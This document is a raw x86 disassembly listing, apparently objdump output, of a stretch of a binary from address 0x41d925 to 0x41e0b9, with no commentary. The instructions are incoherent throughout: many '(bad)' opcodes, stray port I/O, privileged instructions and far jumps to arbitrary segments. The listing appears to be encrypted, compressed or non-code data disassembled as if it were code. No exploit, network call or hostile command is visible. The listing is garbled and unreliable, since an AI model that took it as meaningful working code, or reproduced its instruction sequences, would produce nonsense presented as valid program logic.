  41d925:	or     ebp,ecx
  41d927:	sub    al,0x91
  41d929:	dec    esi
  41d92a:	xor    al,0xb5
  41d92c:	jbe    0x41d90b
  41d92e:	mov    cl,0xfc
  41d930:	stc    
  41d931:	int3   
  41d932:	iret   
  41d933:	pop    edx
  41d934:	sbb    DWORD PTR [edx-0x54],ecx
  41d937:	mov    ebx,0xc0df2402
  41d93c:	(bad)  
  41d93d:	adc    edi,DWORD PTR [edi-0x55d92206]
  41d943:	in     al,dx
  41d944:	dec    edi
  41d945:	bound  edx,QWORD PTR [ebp+0x6b]
  41d948:	pop    ss
  41d949:	push   ebp
  41d94a:	mov    edi,0x2166356c
  41d94f:	test   BYTE PTR [ebx],dl
  41d951:	scas   al,BYTE PTR es:[edi]
  41d952:	out    dx,eax
  41d953:	scas   al,BYTE PTR es:[edi]
  41d954:	jl     0x41d8e1
  41d956:	lahf   
  41d957:	xor    eax,esp
  41d959:	int    0xb3
  41d95b:	pop    esp
  41d95c:	cs push edx
  41d95e:	int3   
  41d95f:	test   eax,0xdb79e204
  41d964:	(bad)  
  41d965:	jb     0x41d9e5
  41d967:	data16 sbb al,0x68
  41d96a:	gs ds pop ss
  41d96d:	aas    
  41d96e:	jo     0x41d92a
  41d970:	pusha  
  41d971:	mov    esi,0x7dbe9992
  41d976:	or     al,BYTE PTR [edx]
  41d978:	push   ds
  41d979:	or     eax,0xcc116511
  41d97e:	bound  eax,QWORD PTR [edi]
  41d980:	add    ecx,DWORD PTR [esi]
  41d982:	push   0x76
  41d984:	aas    
  41d985:	mov    edx,0xa3d60461
  41d98a:	ror    ecx,1
  41d98c:	mov    ecx,0x192fff3c
  41d991:	jge    0x41d99e
  41d993:	add    eax,0x5a5ff2fc
  41d998:	jne    0x41d921
  41d99a:	sub    eax,edi
  41d99c:	loopne 0x41d9a3
  41d99e:	repz or edi,DWORD PTR [ecx+0x3f]
  41d9a2:	and    edi,edi
  41d9a4:	ret    0xfca5
  41d9a7:	sysret 
  41d9a9:	(bad)  
  41d9aa:	adc    bh,BYTE PTR [ebp-0x2c]
  41d9ad:	scas   eax,DWORD PTR es:[edi]
  41d9ae:	rcr    BYTE PTR [ebp+0x56e55473],1
  41d9b4:	repz std 
  41d9b6:	lds    esi,FWORD PTR [ebx+edi*1-0x80]
  41d9ba:	and    al,0xe
  41d9bc:	or     bl,BYTE PTR [eax-0x69]
  41d9bf:	xor    dh,bl
  41d9c1:	dec    eax
  41d9c2:	popf   
  41d9c3:	mov    ds:0xbf25bc32,eax
  41d9c8:	push   es
  41d9c9:	pop    esp
  41d9ca:	aaa    
  41d9cb:	sub    al,0x40
  41d9cd:	jnp    0x41d982
  41d9cf:	inc    esp
  41d9d0:	xchg   BYTE PTR [edx],ah
  41d9d2:	stos   DWORD PTR es:[edi],eax
  41d9d3:	addr16 fwait
  41d9d5:	call   0xd1d5bfd
  41d9da:	fst    DWORD PTR [ecx]
  41d9dc:	cli    
  41d9dd:	sti    
  41d9de:	pop    ecx
  41d9df:	mov    WORD PTR [edx],es
  41d9e1:	out    0x5a,eax
  41d9e3:	add    bl,dh
  41d9e5:	call   0xc4a1:0xf83c79c3
  41d9ec:	and    ch,ah
  41d9ee:	aas    
  41d9ef:	fsub   QWORD PTR [ebx]
  41d9f1:	jne    0x41d985
  41d9f3:	add    esp,DWORD PTR [ebp+0x7238da50]
  41d9f9:	jmp    0xa26c:0x9ba7417f
  41da00:	adc    eax,0xf459928b
  41da05:	cmp    edx,eax
  41da07:	aam    0xd3
  41da09:	fld    QWORD PTR [ebx-0x73]
  41da0c:	or     edi,DWORD PTR [edx+0x26e79065]
  41da12:	jae    0x41d9f6
  41da14:	xor    cl,BYTE PTR [eax-0x3e]
  41da17:	aas    
  41da18:	das    
  41da19:	push   edi
  41da1a:	or     DWORD PTR [eax-0x47950c57],esi
  41da20:	jmp    0x41d9ac
  41da22:	leave  
  41da23:	add    al,0xa3
  41da25:	jp     0x41da1b
  41da27:	aas    
  41da28:	add    BYTE PTR [esi+esi*8+0x25],0xad
  41da2d:	cmc    
  41da2e:	jno    0x41d9da
  41da30:	jp     0x41da12
  41da32:	add    eax,0x785123dd
  41da37:	mov    ecx,0xe71503c7
  41da3c:	repnz mov WORD PTR [esi],ss
  41da3f:	push   ebp
  41da40:	out    dx,eax
  41da41:	mov    ebx,0x4a2247b0
  41da46:	jmp    0x1088a0c6
  41da4b:	pop    ecx
  41da4c:	mov    esp,0xe61d0953
  41da51:	(bad)  
  41da52:	(bad)  
  41da53:	xlat   BYTE PTR ds:[ebx]
  41da54:	mov    eax,0x896a1486
  41da59:	inc    ecx
  41da5a:	sub    al,0xec
  41da5c:	outs   dx,DWORD PTR ds:[esi]
  41da5d:	sub    al,0xf2
  41da5f:	sub    ah,BYTE PTR [edi+0x77]
  41da62:	adc    eax,0x38fb1129
  41da67:	popa   
  41da68:	rcl    DWORD PTR [ebx-0x2f],cl
  41da6b:	jmp    0x6e44e126
  41da70:	mov    edx,0x92c85505
  41da75:	hlt    
  41da76:	cmp    al,0x9c
  41da78:	dec    ecx
  41da79:	retf   
  41da7a:	or     edi,DWORD PTR [ebx]
  41da7c:	push   ebp
  41da7d:	shr    BYTE PTR [ebp+esi*8+0x20907b66],1
  41da84:	inc    eax
  41da85:	sbb    BYTE PTR [ecx+0x13],dl
  41da88:	and    al,0xa2
  41da8a:	out    dx,eax
  41da8b:	xor    eax,0x7a3143bf
  41da90:	jo     0x41da53
  41da92:	out    dx,al
  41da93:	jne    0x41da67
  41da95:	fiadd  DWORD PTR [edi]
  41da97:	add    ecx,ebx
  41da99:	fld    DWORD PTR [esi-0x5fb6e115]
  41da9f:	jbe    0x41da6a
  41daa1:	jae    0x41dafd
  41daa3:	sbb    ch,ah
  41daa5:	sbb    al,0x0
  41daa7:	mov    cl,0xdf
  41daa9:	cli    
  41daaa:	dec    eax
  41daab:	xchg   edi,eax
  41daac:	jl     0x41dacf
  41daae:	ds mov edi,0x5a2129ae
  41dab4:	test   BYTE PTR [edx-0x40],dh
  41dab7:	mov    al,ds:0x1cb6ab53
  41dabc:	inc    edi
  41dabd:	push   0x4d48fb15
  41dac2:	pop    esp
  41dac3:	and    edx,ecx
  41dac5:	in     eax,dx
  41dac6:	(bad)  
  41dac7:	jnp    0x41da6e
  41dac9:	add    DWORD PTR [edx],ebp
  41dacb:	inc    esi
  41dacc:	mov    cl,0x93
  41dace:	call   0x4542:0x2ff1cf94
  41dad5:	loopne 0x41da9a
  41dad7:	fadd   DWORD PTR [ebx-0x1e88ce66]
  41dadd:	mov    edx,0xb12bbe1a
  41dae2:	ins    BYTE PTR es:[edi],dx
  41dae3:	addr16 je 0x41dadd
  41dae6:	push   esp
  41dae7:	loope  0x41db54
  41dae9:	push   ds
  41daea:	nop
  41daeb:	pop    esi
  41daec:	(bad)  
  41daed:	in     eax,dx
  41daee:	nop
  41daef:	(bad)
  41daf2:	fnstenv [edx+0x79]
  41daf5:	setns  BYTE PTR [ebx]
  41daf8:	dec    ecx
  41daf9:	push   0xd44dc16b
  41dafe:	add    eax,0xa91c365c
  41db03:	int    0xec
  41db05:	test   eax,0x90b292b4
  41db0a:	retf   0x3845
  41db0d:	push   ss
  41db0e:	cmp    eax,0xa304964c
  41db13:	bound  edx,QWORD PTR [esi]
  41db15:	ficom  WORD PTR [edx+edx*2+0x549b56a8]
  41db1c:	mov    WORD PTR [esi+0x65bcd196],ds
  41db22:	push   edx
  41db23:	int    0xc7
  41db25:	repz xchg esi,eax
  41db27:	jae    0x41db3c
  41db29:	fwait
  41db2a:	scas   al,BYTE PTR es:[edi]
  41db2b:	test   eax,0xe7b1c279
  41db30:	push   ds
  41db31:	pop    ss
  41db32:	lds    ebx,FWORD PTR [edx]
  41db34:	mov    esi,0xe17b815
  41db39:	stos   BYTE PTR es:[edi],al
  41db3a:	mov    dh,0x8e
  41db3c:	push   esi
  41db3d:	mov    al,0x9c
  41db3f:	std    
  41db40:	adc    eax,0x8dea18f6
  41db45:	icebp  
  41db46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db47:	or     esp,DWORD PTR [ecx-0x6]
  41db4a:	cmc    
  41db4b:	imul   edi,ecx,0x640d91d1
  41db51:	cmp    BYTE PTR [ebx+edx*2],ah
  41db54:	(bad)  
  41db55:	jmp    0xa056:0xdcf157ae
  41db5c:	jbe    0x41daf1
  41db5e:	sub    cl,ah
  41db60:	loopne 0x41dba0
  41db62:	jns    0x41db08
  41db64:	das    
  41db65:	cmp    edi,DWORD PTR [ecx]
  41db67:	mov    BYTE PTR [esp+esi*1-0x38],0x26
  41db6c:	jae    0x41db7d
  41db6e:	adc    ebp,edx
  41db70:	dec    ecx
  41db71:	jge    0x41db9a
  41db73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db74:	int    0x43
  41db76:	push   edi
  41db77:	push   esi
  41db78:	leave  
  41db79:	pop    ebp
  41db7a:	adc    BYTE PTR [edx],bh
  41db7c:	fldcw  WORD PTR [esp+eiz*8+0x49eb3e25]
  41db83:	and    al,0xe1
  41db85:	test   ebx,0x30240b32
  41db8b:	dec    ebp
  41db8c:	adc    DWORD PTR [esi],ecx
  41db8e:	sahf   
  41db8f:	idiv   bl
  41db91:	fild   DWORD PTR [edx]
  41db93:	mov    ch,0xb4
  41db95:	scas   al,BYTE PTR es:[edi]
  41db96:	xchg   DWORD PTR [ecx-0x10],edi
  41db99:	int    0x32
  41db9b:	shr    BYTE PTR [ebx-0x34],1
  41db9e:	mov    bh,0xcb
  41dba0:	stos   BYTE PTR es:[edi],al
  41dba1:	mov    cl,0xe7
  41dba3:	push   edi
  41dba4:	or     eax,0xe13d7d87
  41dba9:	jmp    0x9d9be344
  41dbae:	fcmovne st,st(7)
  41dbb0:	mov    cs,WORD PTR [edx+0x2c5eda6c]
  41dbb6:	out    dx,eax
  41dbb7:	add    dh,BYTE PTR [edx]
  41dbb9:	repnz popaw 
  41dbbc:	jo     0x41db88
  41dbbe:	xor    DWORD PTR [ebp-0x6d],ebp
  41dbc1:	mov    eax,0xf4fefed4
  41dbc6:	jno    0x41dbfa
  41dbc8:	add    edi,DWORD PTR [edi+0x7d]
  41dbcb:	mov    dl,0xb6
  41dbcd:	add    BYTE PTR [esp+esi*8],0x7
  41dbd1:	jns    0x41dbc2
  41dbd3:	mov    ebp,0xc2b4e514
  41dbd8:	fild   WORD PTR [ecx]
  41dbda:	mov    ebx,0xf5566b91
  41dbdf:	sub    al,BYTE PTR [eax]
  41dbe1:	push   edi
  41dbe2:	xor    eax,0x15a72be1
  41dbe7:	sub    ecx,DWORD PTR [esp+ecx*8]
  41dbea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbeb:	je     0x41db8f
  41dbed:	retf   
  41dbee:	dec    ebx
  41dbef:	xor    DWORD PTR [ecx+0xc],ebp
  41dbf2:	ss hlt 
  41dbf4:	sub    ecx,DWORD PTR [ecx-0x70339e91]
  41dbfa:	xlat   BYTE PTR ds:[ebx]
  41dbfb:	jo     0x41dbfc
  41dbfd:	(bad)  
  41dbfe:	push   eax
  41dbff:	mov    bl,0x70
  41dc01:	pusha  
  41dc02:	or     ecx,DWORD PTR ds:0xe9e229a9
  41dc08:	add    dl,BYTE PTR [edi]
  41dc0a:	outs   dx,DWORD PTR ds:[esi]
  41dc0b:	adc    ebp,DWORD PTR [edx+0x38b19511]
  41dc11:	cmp    cl,BYTE PTR [ebp+eax*2-0xe]
  41dc15:	mov    ebx,0x6b1698c4
  41dc1a:	sbb    al,0x7c
  41dc1c:	jge    0x41dc59
  41dc1e:	push   ss
  41dc1f:	add    eax,0xac7f9322
  41dc24:	jle    0x41dc34
  41dc26:	loopne 0x41dc50
  41dc28:	mov    DWORD PTR ds:0x8520e308,ebp
  41dc2e:	ror    BYTE PTR [esi],0xeb
  41dc31:	je     0x41dbdf
  41dc33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc34:	push   ebx
  41dc35:	jmp    0x41dc05
  41dc37:	mov    WORD PTR [edx+edi*8],fs
  41dc3a:	jle    0x41dc9c
  41dc3c:	dec    edi
  41dc3d:	push   eax
  41dc3e:	and    al,BYTE PTR [edi+edi*8+0x2c54baab]
  41dc45:	mov    BYTE PTR [edi-0x6d2296e0],ch
  41dc4b:	xchg   BYTE PTR [ebp+0x32],bl
  41dc4e:	out    dx,al
  41dc4f:	mov    dl,0x69
  41dc51:	xchg   ebx,eax
  41dc52:	ret    
  41dc53:	push   ss
  41dc54:	ret    
  41dc55:	cmc    
  41dc56:	not    esp
  41dc58:	sbb    al,0x6c
  41dc5a:	sub    eax,0x9876161c
  41dc5f:	aam    0xb4
  41dc61:	jg     0x41dcd2
  41dc63:	xchg   BYTE PTR [ebx-0x739604cb],ch
  41dc69:	repz jmp 0x4401:0xbdf5beb1
  41dc71:	stos   BYTE PTR es:[edi],al
  41dc72:	bound  esi,QWORD PTR [ebp-0x7]
  41dc75:	es push es
  41dc77:	pop    eax
  41dc78:	jnp    0x41dcd6
  41dc7a:	dec    esi
  41dc7b:	xchg   ebp,eax
  41dc7c:	add    ecx,edx
  41dc7e:	clc    
  41dc7f:	es mov ebx,0xfda64aee
  41dc85:	pop    es
  41dc86:	mov    esp,0x500fd7ed
  41dc8b:	stos   DWORD PTR es:[edi],eax
  41dc8c:	cli    
  41dc8d:	dec    eax
  41dc8e:	push   esp
  41dc8f:	sar    DWORD PTR [eax-0x26c19c3d],1
  41dc95:	xor    al,0x19
  41dc97:	in     al,0xbc
  41dc99:	xlat   BYTE PTR ds:[ebx]
  41dc9a:	add    BYTE PTR [edx-0x9],0x45
  41dc9e:	mov    edx,0x98d68e9d
  41dca3:	ja     0x41dc61
  41dca5:	dec    edx
  41dca6:	pushf  
  41dca7:	or     bh,ah
  41dca9:	nop
  41dcaa:	fs push 0x6b
  41dcad:	or     BYTE PTR [esi+0x7b958135],al
  41dcb3:	push   esp
  41dcb4:	adc    bl,cl
  41dcb6:	cmp    eax,0xcc0b328a
  41dcbb:	div    BYTE PTR [edx+0x73]
  41dcbe:	mov    ecx,0xc33b9ed6
  41dcc3:	mov    ?,WORD PTR [ebx+0x4f]
  41dcc6:	mov    eax,0xd0a9109b
  41dccb:	in     eax,0xe9
  41dccd:	jg     0x41dccb
  41dccf:	mov    ecx,0xcd89a2aa
  41dcd4:	dec    edi
  41dcd5:	sub    BYTE PTR [edi],dl
  41dcd7:	jo     0x41dcef
  41dcd9:	stos   DWORD PTR es:[edi],eax
  41dcda:	xor    dl,BYTE PTR [ecx+0x22]
  41dcdd:	cwde   
  41dcde:	fst    DWORD PTR [ecx+edx*4]
  41dce1:	xchg   esp,eax
  41dce2:	inc    ebp
  41dce3:	mov    ecx,0xbd51b562
  41dce8:	stos   BYTE PTR es:[edi],al
  41dce9:	inc    BYTE PTR [edx+0x57]
  41dcec:	inc    edx
  41dced:	mov    ds:0x2d652985,al
  41dcf2:	test   BYTE PTR [esi+0x27],bh
  41dcf5:	jno    0x41dd36
  41dcf7:	adc    edx,esi
  41dcf9:	cwde   
  41dcfa:	call   0xfd07:0xf9f734f9
  41dd01:	xchg   ecx,eax
  41dd02:	jg     0x41dcec
  41dd04:	repz pusha 
  41dd06:	mov    ds:0xdc99d727,al
  41dd0b:	lahf   
  41dd0c:	lahf   
  41dd0d:	loop   0x41dd12
  41dd0f:	sub    dh,BYTE PTR [esi+0x4a]
  41dd12:	xchg   edx,eax
  41dd13:	in     eax,0x92
  41dd15:	ror    BYTE PTR [edi+0x5d],0xf4
  41dd19:	jl     0x41dd00
  41dd1b:	sbb    DWORD PTR [ecx],edx
  41dd1d:	and    al,0x7a
  41dd1f:	fs ret 
  41dd21:	jecxz  0x41dd99
  41dd23:	jle    0x41dcab
  41dd25:	ror    DWORD PTR [edi+esi*1],cl
  41dd28:	lahf   
  41dd29:	sub    BYTE PTR [edx+0x52],0x8d
  41dd2d:	fcom   DWORD PTR [bp+si+0x3981]
  41dd32:	popa   
  41dd33:	adc    BYTE PTR [ecx-0x3d4f101f],dl
  41dd39:	dec    edi
  41dd3a:	bound  ebx,QWORD PTR [eax-0x14589fae]
  41dd40:	push   ebp
  41dd41:	aam    0xec
  41dd43:	in     eax,0x48
  41dd45:	sbb    edi,DWORD PTR [esi+0x7d900769]
  41dd4b:	pop    ebp
  41dd4c:	pop    ds
  41dd4d:	in     al,dx
  41dd4e:	push   ebp
  41dd4f:	repnz in eax,dx
  41dd51:	push   edi
  41dd52:	mov    ch,0xbc
  41dd54:	stos   BYTE PTR es:[edi],al
  41dd55:	scas   al,BYTE PTR es:[edi]
  41dd56:	sub    DWORD PTR [edx+edi*4-0x4631027c],esp
  41dd5d:	sub    DWORD PTR [eax+0x1e],ebx
  41dd60:	mov    bh,0x68
  41dd62:	inc    edi
  41dd63:	stc    
  41dd64:	fxch   st(7)
  41dd66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd67:	prefetch BYTE PTR [esi-0x42]
  41dd6b:	test   DWORD PTR [eax-0x8],0xc66fa04
  41dd72:	xor    cl,cl
  41dd74:	fwait
  41dd75:	lahf   
  41dd76:	sbb    DWORD PTR [ebx+0x57],ecx
  41dd79:	xchg   ecx,eax
  41dd7a:	and    al,0x8a
  41dd7c:	addr16 repz enter 0x40b7,0x55
  41dd82:	cmp    eax,0x70356d0e
  41dd87:	xchg   esp,eax
  41dd88:	cmc    
  41dd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd8a:	mov    ecx,0x6fdf414
  41dd8f:	adc    esi,DWORD PTR [eax]
  41dd91:	retf   0x22c
  41dd94:	jne    0x41dd3a
  41dd96:	pusha  
  41dd97:	xchg   edi,eax
  41dd98:	arpl   WORD PTR [ecx+edx*8+0x4603d839],di
  41dd9f:	cmovg  edi,DWORD PTR [eax+0x9]
  41dda3:	mov    ecx,0xbe71fc99
  41dda8:	fsubr  QWORD PTR [edi+eax*1-0x6d]
  41ddac:	mov    BYTE PTR [esi],ch
  41ddae:	int    0x2a
  41ddb0:	dec    esi
  41ddb1:	mov    esp,0x18c2eed7
  41ddb6:	xor    al,0xa4
  41ddb8:	xchg   edi,eax
  41ddb9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddbb:	je     0x41de30
  41ddbd:	into   
  41ddbe:	dec    ecx
  41ddbf:	pop    edi
  41ddc0:	xor    ch,0xd9
  41ddc3:	xor    eax,0x4c041e04
  41ddc8:	or     DWORD PTR fs:[esi+edx*1+0x4f7b7662],0xffffffad
  41ddd1:	adc    al,0x5c
  41ddd3:	(bad)  
  41ddd4:	cmp    esi,esi
  41ddd6:	sahf   
  41ddd7:	push   eax
  41ddd8:	adc    BYTE PTR [edx+0x57],ah
  41dddb:	(bad)  
  41dddc:	pop    edx
  41dddd:	jl     0x41de45
  41dddf:	(bad)  
  41dde0:	pop    esp
  41dde1:	shr    BYTE PTR [eax+0x23a987c6],1
  41dde7:	push   ss
  41dde8:	stc    
  41dde9:	iret   
  41ddea:	(bad)  
  41ddeb:	pop    ss
  41ddec:	push   0x9cf89901
  41ddf1:	sbb    al,0x57
  41ddf3:	push   ebp
  41ddf4:	xchg   esi,eax
  41ddf5:	loope  0x41ddee
  41ddf7:	enter  0xf11d,0x0
  41ddfb:	into   
  41ddfc:	jmp    0x41de00
  41ddfe:	out    dx,eax
  41ddff:	in     eax,dx
  41de00:	mul    DWORD PTR [ecx-0x78]
  41de03:	bswap  ebx
  41de05:	das    
  41de06:	jg     0x41de67
  41de08:	fmul   DWORD PTR [edx]
  41de0a:	sub    BYTE PTR [eax+ebx*2],ah
  41de0d:	repz inc ebx
  41de0f:	aas    
  41de10:	jle    0x41dda7
  41de12:	adc    BYTE PTR [ecx-0x4e439a62],bh
  41de18:	jne    0x41dde8
  41de1a:	jb     0x41de58
  41de1c:	out    dx,al
  41de1d:	stc    
  41de1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de1f:	mov    ecx,0x2a3ffc2c
  41de24:	and    eax,0xddaca255
  41de29:	scas   al,BYTE PTR es:[edi]
  41de2a:	sub    eax,0x9ef75d68
  41de2f:	and    ebx,DWORD PTR [ebx-0x210102d3]
  41de35:	fild   WORD PTR [ecx-0x4f]
  41de38:	loop   0x41ddd9
  41de3a:	xor    ecx,DWORD PTR [esi+0x7c]
  41de3d:	pop    ss
  41de3e:	shl    eax,0x14
  41de41:	(bad)  
  41de42:	pop    esi
  41de43:	and    edx,eax
  41de45:	sbb    ch,bh
  41de47:	lds    ebx,FWORD PTR [edx-0x62c0ecfc]
  41de4d:	and    ah,bh
  41de4f:	fucom  st(6)
  41de51:	cwde   
  41de52:	js     0x41de73
  41de54:	sbb    ah,BYTE PTR [edi-0x7f]
  41de57:	das    
  41de58:	and    ch,BYTE PTR [ebp-0x7b]
  41de5b:	sbb    bh,al
  41de5d:	stos   DWORD PTR es:[edi],eax
  41de5e:	sbb    al,0xa3
  41de60:	dec    eax
  41de61:	nop
  41de62:	stos   BYTE PTR es:[edi],al
  41de63:	cmp    ebp,DWORD PTR [ebp-0x30]
  41de66:	jg     0x41de11
  41de68:	pop    edx
  41de69:	out    0x86,al
  41de6b:	stc    
  41de6c:	icebp  
  41de6d:	jecxz  0x41de43
  41de6f:	scas   al,BYTE PTR es:[edi]
  41de70:	jecxz  0x41dec2
  41de72:	jmp    FWORD PTR [ebx+0x60a3d5c0]
  41de78:	xor    dh,al
  41de7a:	in     eax,dx
  41de7b:	das    
  41de7c:	fisub  DWORD PTR [esi]
  41de7e:	jns    0x41de43
  41de80:	xchg   BYTE PTR [ebp-0x57],cl
  41de83:	xlat   BYTE PTR ds:[ebx]
  41de84:	(bad)  
  41de85:	and    esp,DWORD PTR [edx]
  41de87:	jge    0x41de1c
  41de89:	push   ebx
  41de8a:	push   eax
  41de8b:	xor    ch,dh
  41de8d:	mov    DWORD PTR [edi-0xa],0xa8e05018
  41de94:	cli    
  41de95:	jmp    0x41de32
  41de97:	int    0x27
  41de99:	call   0xdc15:0xd79a190
  41dea0:	test   DWORD PTR [ebp+0x3c],edx
  41dea3:	pop    ds
  41dea4:	cmp    eax,DWORD PTR [ebx+0x78ff0ab0]
  41deaa:	cmp    eax,0xc42f56f5
  41deaf:	mov    ds:0x49835bec,al
  41deb4:	dec    edx
  41deb5:	push   ds
  41deb6:	fwait
  41deb7:	imul   ecx,DWORD PTR [ebp+ebx*4-0xf],0x3c7ad9
  41debf:	and    bl,bh
  41dec1:	mov    ah,0x89
  41dec3:	fs stos BYTE PTR es:[edi],al
  41dec5:	outs   dx,BYTE PTR ds:[esi]
  41dec6:	call   0x8714:0xcb914d62
  41decd:	fwait
  41dece:	adc    BYTE PTR [edi-0x5ac51b82],ah
  41ded4:	mov    al,ds:0xb63e712c
  41ded9:	mov    edi,0x5c48fef4
  41dede:	add    BYTE PTR [esi+0x34],0x18
  41dee2:	mov    DWORD PTR [edi-0x66935662],esp
  41dee8:	inc    eax
  41dee9:	sub    al,ch
  41deeb:	add    eax,0x571a206c
  41def0:	leave  
  41def1:	pop    eax
  41def2:	ds cwde 
  41def4:	fdiv   DWORD PTR ds:0xde835bc3
  41defa:	add    al,0xc7
  41defc:	enter  0xadd7,0xac
  41df00:	or     DWORD PTR [ecx+0x65],edi
  41df03:	dec    eax
  41df04:	lods   eax,DWORD PTR ds:[esi]
  41df05:	out    0xe,eax
  41df07:	mov    eax,0xd3cf1d89
  41df0c:	enter  0xef7d,0xf9
  41df10:	push   es
  41df11:	aaa    
  41df12:	mov    ecx,0x38dc0012
  41df17:	mov    bl,0x36
  41df19:	popa   
  41df1a:	(bad)  
  41df1b:	xor    esp,0x1a
  41df1e:	fcomp  DWORD PTR [edi+ecx*8]
  41df21:	stos   BYTE PTR es:[edi],al
  41df22:	add    BYTE PTR [eax+esi*2+0x551b11eb],bl
  41df29:	mov    BYTE PTR [ecx+0x3d0c4a72],0xe5
  41df30:	icebp  
  41df31:	xchg   DWORD PTR [ebx+0xb],edx
  41df34:	daa    
  41df35:	cmc    
  41df36:	mov    bl,0x4f
  41df38:	cmovo  ebx,DWORD PTR [edx+0x9]
  41df3c:	mov    esi,0xf949057b
  41df41:	das    
  41df42:	mov    bl,BYTE PTR [ebp-0x17c7514f]
  41df48:	les    esi,FWORD PTR [esi+0x458db09b]
  41df4e:	cmp    al,bh
  41df50:	aam    0xc3
  41df52:	pop    esp
  41df53:	rol    DWORD PTR [edx+0x5],cl
  41df56:	clc    
  41df57:	mul    DWORD PTR [esi+esi*4+0x4b]
  41df5b:	inc    eax
  41df5c:	mov    ebx,0x905765bd
  41df61:	test   BYTE PTR [ebp+0x1d],0xb0
  41df65:	jp     0x41df5c
  41df67:	cmp    bl,BYTE PTR [eax+eax*1]
  41df6a:	cdq    
  41df6b:	fwait
  41df6c:	mov    ds:0xa68a06f,eax
  41df71:	fmul   QWORD PTR ds:0xb6a0c4de
  41df77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df78:	mov    bh,0x8a
  41df7a:	pop    ebx
  41df7b:	inc    edx
  41df7c:	dec    edx
  41df7d:	dec    edx
  41df7e:	int3   
  41df7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df80:	test   DWORD PTR [edx+eiz*1+0x5f],eax
  41df84:	fdivr  DWORD PTR [eax-0x7c4f2e62]
  41df8a:	mov    sp,WORD PTR [eax+0x72]
  41df8e:	mov    esi,0x58f09fcf
  41df93:	test   al,0xf1
  41df95:	adc    ebp,ebx
  41df97:	cli    
  41df98:	and    esi,0x44584a82
  41df9e:	repnz sub dh,cl
  41dfa1:	nop
  41dfa2:	add    eax,0xcc576691
  41dfa7:	sti    
  41dfa8:	and    edi,DWORD PTR [eax+ebp*4-0x18]
  41dfac:	add    DWORD PTR [eax+0x1814350a],0x5df8aaae
  41dfb6:	push   ebp
  41dfb7:	xchg   ecx,eax
  41dfb8:	add    al,0x4e
  41dfba:	mov    al,ds:0x88af1183
  41dfbf:	or     al,0xba
  41dfc1:	mov    ds:0xcf3e4edf,eax
  41dfc6:	dec    ebp
  41dfc7:	mov    esi,0xdf4be14b
  41dfcc:	ins    DWORD PTR es:[edi],dx
  41dfcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfce:	iret   
  41dfcf:	rcr    esi,0xa4
  41dfd2:	mov    cl,0x15
  41dfd4:	jmp    0xe47e1810
  41dfd9:	inc    ecx
  41dfda:	retf   0xf57d
  41dfdd:	lods   al,BYTE PTR ds:[esi]
  41dfde:	nop
  41dfdf:	mov    al,ds:0x6d975025
  41dfe4:	fcmovnb st,st(2)
  41dfe6:	xor    ch,BYTE PTR [esi+0x39]
  41dfe9:	stos   BYTE PTR es:[edi],al
  41dfea:	mov    WORD PTR [edx],?
  41dfec:	int    0x2f
  41dfee:	xchg   ebp,eax
  41dfef:	shr    BYTE PTR [ecx+0x8a38eef],0x85
  41dff6:	sar    BYTE PTR [ebp+0x6304e38c],cl
  41dffc:	dec    esp
  41dffd:	sbb    eax,0xb98c0b41
  41e002:	mov    esi,0x3d9297a
  41e007:	mov    dh,BYTE PTR [ebp-0x64]
  41e00a:	pop    edx
  41e00b:	mov    ds:0x85268db3,eax
  41e010:	or     edi,DWORD PTR [ebx+0x5aa49d4f]
  41e016:	loope  0x41e00f
  41e018:	mov    ebx,0x8342c3b0
  41e01d:	jg     0x41e05b
  41e01f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e020:	mov    ecx,0xb970be3b
  41e025:	push   ds
  41e026:	jmp    0x41e093
  41e028:	push   0xf35a7a93
  41e02d:	mov    es,WORD PTR [edi-0x1f05e888]
  41e033:	add    esp,DWORD PTR [ebp-0x6b]
  41e036:	jge    0x41dfc6
  41e038:	(bad)  
  41e039:	xlat   BYTE PTR ds:[ebx]
  41e03a:	cmp    cl,0x56
  41e03d:	test   BYTE PTR [ebx-0x3478fb3f],ch
  41e043:	int3   
  41e044:	sub    BYTE PTR ds:0x23489496,dl
  41e04a:	lods   eax,DWORD PTR ds:[esi]
  41e04b:	mov    cl,0x6e
  41e04d:	ja     0x41e043
  41e04f:	push   cs
  41e050:	jne    0x41e061
  41e052:	ds xchg esi,eax
  41e054:	jnp    0x41dfe1
  41e056:	in     al,dx
  41e057:	mov    cl,0x9d
  41e059:	add    ebx,DWORD PTR [ebx-0x30e0fbc5]
  41e05f:	test   ecx,ebp
  41e061:	(bad)  
  41e062:	ja     0x41e0c3
  41e064:	retf   0xafc
  41e067:	popf   
  41e068:	xchg   dh,al
  41e06a:	(bad)  
  41e06b:	aam    0x27
  41e06d:	and    DWORD PTR [esi+0x41],ebp
  41e070:	jmp    0x41e0dc
  41e072:	aad    0x2a
  41e074:	or     ch,BYTE PTR [edi]
  41e076:	test   al,0xde
  41e078:	sbb    DWORD PTR [edx-0x349640d5],esp
  41e07e:	push   ds
  41e07f:	mov    ss,WORD PTR ds:0xe36dc268
  41e085:	push   ds
  41e086:	and    al,0x69
  41e088:	pop    esp
  41e089:	sbb    bl,BYTE PTR [ebp-0x3cde955d]
  41e08f:	jb     0x41e100
  41e091:	rcr    BYTE PTR [ebp+0x1f],1
  41e094:	mov    cl,0x93
  41e096:	call   0xad572a73
  41e09b:	sbb    al,bh
  41e09d:	pop    ss
  41e09e:	push   ss
  41e09f:	jmp    0xf9f6:0xa1b26562
  41e0a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a7:	fcmovu st,st(5)
  41e0a9:	add    dl,dl
  41e0ab:	out    0x59,eax
  41e0ad:	mul    BYTE PTR [ebp+0x341cf4a8]
  41e0b3:	call   FWORD PTR [eax-0x118f9d41]
  41e0b9:	mov    WORD PTR ds:0x70941f91,?
